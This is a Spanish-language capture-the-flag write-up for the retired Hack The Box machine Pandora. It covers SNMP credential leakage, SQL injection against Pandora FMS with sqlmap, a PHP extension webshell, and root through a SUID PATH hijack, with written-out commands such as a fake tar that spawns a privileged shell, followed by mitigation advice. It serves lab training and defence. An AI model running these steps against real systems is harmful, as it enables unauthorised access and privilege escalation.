---
machine: Pandora
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, snmp, pandora-fms, sqli, suid, path-hijack]
---

# Pandora — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

SNMP con comunidad `public` filtra credenciales de la base de datos. Pandora FMS es vulnerable a SQLi, lo que permite entrar al panel y subir una extensión; un binario SUID (`pandora_backup`) ejecuta `tar` sin ruta absoluta y permite un PATH hijack hasta root.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sU -p161 --script snmp-brute,snmp-info <IP>
snmpwalk -v2c -c public <IP>
```

SNMP devuelve procesos y credenciales de MySQL/Pandora. Se añade `pandora.htb` al hosts y se revisa el puerto 80.

## Acceso inicial

Pandora FMS 7.0NG es vulnerable a SQLi en el panel de administración. Se usa `sqlmap` o una carga manual para extraer usuarios y hashes. Con credenciales válidas se accede al panel.

```bash
sqlmap -u 'http://pandora.htb/pandora_console/index.php?...' --batch --dbs
```

## Movimiento lateral

El panel permite subir extensiones o scripts. Se sube una extensión PHP que ejecuta comandos y se obtiene una shell como `www-data`/`pandora`.

## Escalada a root

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/usr/bin/pandora_backup` es SUID y llama a `tar` sin ruta absoluta. Se crea un `tar` malicioso en un directorio controlado y se antepone al PATH:

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
PATH=/tmp:$PATH /usr/bin/pandora_backup
```

La shell resultante es root.

## Evidencia

- `snmpwalk` con credenciales redactadas.
- Consulta SQLi y volcado redactado.
- Extensión subida y shell.
- `pandora_backup` SUID y PATH hijack.

## Lecciones aprendidas

- SNMP con comunidad por defecto expone procesos y secretos.
- Pandora FMS antiguo requiere revisión de SQLi y subida de extensiones.
- Los SUID que invocan binarios sin ruta absoluta son escalada directa.
- El PATH del servicio importa.

## Mitigación y detección

- Deshabilitar SNMP o usar v3 con ACLs.
- Actualizar Pandora FMS y parametrizar consultas.
- Restringir subida de extensiones.
- Usar rutas absolutas en scripts privilegiados.

## Referencias

- <https://www.hackthebox.com/machines/pandora>
- <https://pandorafms.com/>
- <https://gtfobins.github.io/gtfobins/tar/>
